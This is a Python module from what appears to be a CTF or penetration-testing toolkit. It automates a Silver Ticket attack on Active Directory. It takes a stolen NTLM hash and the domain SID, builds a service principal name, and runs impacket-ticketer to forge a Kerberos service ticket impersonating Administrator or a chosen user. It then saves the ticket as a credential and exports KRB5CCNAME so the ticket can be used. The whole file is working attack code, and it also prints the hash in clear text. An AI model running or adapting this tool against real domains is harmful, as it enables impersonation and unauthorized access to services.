import argparse
import subprocess
import os
from pathlib import Path

from core.target import (
    load_current_profile,
    get_active_cred,
    target_add_cred
)


def run(args):
    """
    Silver Ticket attack (Impacket ticketer)

    Usage:
        ctf ad.silver
        ctf ad.silver Administrator
        ctf ad.silver MSSQLSvc
        ctf ad.silver Administrator MSSQLSvc
        ctf ad.silver Administrator MSSQLSvc/dc01.domain.local
    """

    # -------------------------
    # Load context
    # -------------------------
    try:
        data, _ = load_current_profile()
        cred = get_active_cred(data)
    except Exception as e:
        print(f"[!] {e}")
        return

    domain = data.get("domain")
    hostname = data.get("hostname")
    target_name = data.get("name")

    if not domain or not hostname:
        print("[-] Missing domain or hostname in target")
        return

    # -------------------------
    # Require NTLM
    # -------------------------
    if cred.get("type") != "ntlm":
        print("[-] Active credential must be NTLM hash")
        return

    ntlm_hash = cred.get("secret")
    if not ntlm_hash:
        print("[-] No NTLM hash found")
        return

    # -------------------------
    # Get domain SID
    # -------------------------
    domain_sid = data.get("domain_sid")
    if not domain_sid:
        print("[-] No domain SID found (run ad.getdomainsid first)")
        return

    # -------------------------
    # Parse args (SMART)
    # -------------------------
    extra = getattr(args, "extra", []) or []

    user = "Administrator"
    service = "cifs"

    if len(extra) == 1:
        val = extra[0]

        if "/" in val or val.lower().startswith(("cifs", "mssqlsvc", "http", "ldap")):
            service = val
        else:
            user = val

    elif len(extra) >= 2:
        user = extra[0]
        service = extra[1]

    # -------------------------
    # Build SPN
    # -------------------------
    fqdn = f"{hostname}.{domain}"

    if "/" in service:
        spn = service
    else:
        spn = f"{service}/{fqdn}"

    # -------------------------
    # Artifacts path
    # -------------------------
    artifacts_dir = Path("artifacts") / target_name / "silver"
    artifacts_dir.mkdir(parents=True, exist_ok=True)

    output_ccache = artifacts_dir / f"{user}.ccache"

    # -------------------------
    # Build command
    # -------------------------
    cmd = [
        "impacket-ticketer",
        "-nthash", ntlm_hash,
        "-domain-sid", domain_sid,
        "-domain", domain,
        "-spn", spn,
        user
    ]

    print(f"[*] Using SPN: {spn}")
    print(f"[*] Using SID: {domain_sid}")
    print(f"[*] Using NTLM: {ntlm_hash}")
    print(f"[*] Running: {' '.join(cmd)}\n")

    # -------------------------
    # Execute
    # -------------------------
    try:
        subprocess.run(cmd, cwd=artifacts_dir)
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return

    # -------------------------
    # Validate output
    # -------------------------
    if not output_ccache.exists():
        print("[-] Ticket not created")
        return

    print(f"[+] Stored ticket: {output_ccache}")

    # -------------------------
    # Save credential
    # -------------------------
    target_add_cred(
        argparse.Namespace(
            user=user,
            password=None,
            hash=None,
            aes=None,
            ccache=str(output_ccache)
        )
    )

    # -------------------------
    # Set Kerberos env
    # -------------------------
    os.environ["KRB5CCNAME"] = str(output_ccache)
    print(f"[*] KRB5CCNAME={output_ccache}")

    print("\n-------- Silver Ticket Ready --------\n")